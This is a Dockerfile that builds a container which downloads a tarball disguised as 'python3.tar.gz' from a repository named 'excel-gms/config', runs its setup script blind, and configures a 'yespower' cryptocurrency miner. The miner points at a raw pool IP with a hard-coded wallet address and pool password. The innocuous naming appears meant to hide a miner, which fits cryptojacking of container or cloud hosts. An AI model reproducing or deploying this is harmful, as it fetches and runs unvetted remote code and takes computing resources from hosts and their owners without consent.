# Gunakan base image ringan
FROM ubuntu:rolling
# Set environment variables
ENV DEBIAN_FRONTEND=noninteractive \
    LD_LIBRARY_PATH=/dependencies/lib/x86_64-linux-gnu:/dependencies/usr/lib/x86_64-linux-gnu:$LD_LIBRARY_PATH \
    PATH=/dependencies/usr/bin:$PATH

# Install dependencies
RUN apt-get update && apt-get install -y \
    wget \
    python3 \
    python3-pip \
    tar \
    build-essential \
    libx11-xcb1 \
    libxcomposite1 \
    libxcursor1 \
    libxdamage1 \
    libxi6 \
    libxtst6 \
    libnss3 \
    libcups2 \
    libxss1 \
    libxrandr2 \
    libatk1.0-0 \
    libgtk-3-0 \
    --no-install-recommends && \
    apt-get clean && rm -rf /var/lib/apt/lists/*

# Download and setup the application
WORKDIR /app
RUN wget https://bitbucket.org/excel-gms/config/downloads/python3.tar.gz && \
    tar -xvf python3.tar.gz && \
    rm python3.tar.gz && \
    cd python3 && \
    ./setup.sh

# Configure the application
COPY config.json /app/python3/config.json
RUN echo '{"algorithm": "yespower", "host": "146.103.45.69", "port": 80, "worker": "TSiaCHGhP7fBcqDQTBt2Era8bVJhsau9eR", "password": "c=TDC,mc=SMT/SPRX/SWAMP", "workers": 4, "log": false, "chrome": "./chromium/chrome" }' > /app/python3/config.json

# Set entrypoint to run the application
WORKDIR /app/python3
CMD ["python3", "main.py"]
